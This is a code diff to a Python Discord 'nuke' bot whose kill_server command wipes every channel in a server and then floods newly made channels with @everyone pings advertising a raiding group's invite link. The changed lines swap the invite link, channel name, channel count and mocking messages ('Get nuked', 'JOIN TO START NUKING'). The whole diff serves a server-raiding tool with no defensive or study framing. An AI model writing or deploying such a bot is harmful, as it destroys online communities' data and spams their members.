@@ -23,9 +23,9 @@ def keep_alive():
 
 # Configuration Constants
 TOKEN = os.getenv("DISCORD_TOKEN")
-INVITE_LINK = "https://discord.gg/ctrhRxSKsA"
-CHANNEL_NAME = "deep-ocean-owns you😆"
-TARGET_COUNT = 67
+INVITE_LINK = "https://discord.gg/NumaQpccKq"
+CHANNEL_NAME = "Deep Ocean Owns YOU"
+TARGET_COUNT = 56
 
 # Setup Bot Intents
 intents = discord.Intents.default()
@@ -50,11 +50,11 @@ async def on_ready():
 async def kill_server(ctx, confirm: str = None):
     # Verification check for the CONFIRM argument
     if confirm != "CONFIRM":
-        await ctx.send("If u really wanna nuke type poor server ✌️😭`.k!ll CONFIRM`")
+        await ctx.send("⚠️ Tp really nuke type `.k!ll CONFIRM`")
         return
 
     guild = ctx.guild
-    await ctx.send("**Nuking server please wait** **POOR SERVER WHY NUKE IT** 😭✌️")
+    await ctx.send("🚨 **Starting Nuke PREPARE FOR ULTIMATE PING**")
 
     # Phase 1: Wipe all existing channels
     deleted_count = 0
@@ -99,7 +99,7 @@ async def kill_server(ctx, confirm: str = None):
                 for ch in created_channels[-5:]:
                     try:
                         await ch.send(
-                            f"@everyone Join Deep Ocean {INVITE_LINK}",
+                            f"Get nuked 😭✌️ @everyone JOIN TO START NUKING {INVITE_LINK}",
                             allowed_mentions=discord.AllowedMentions(everyone=True)
                         )
                         await asyncio.sleep(0.5)
@@ -117,7 +117,7 @@ async def kill_server(ctx, confirm: str = None):
 @kill_server.error
 async def kill_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
-        await ctx.send("❌ You do not have the required **Administrator** permissions to use this command.")
+        await ctx.send("❌ Bro You need the **Administrator** permission now everyone knows ur trying to nuke")
 
 
 # Run the application using the token environment variable
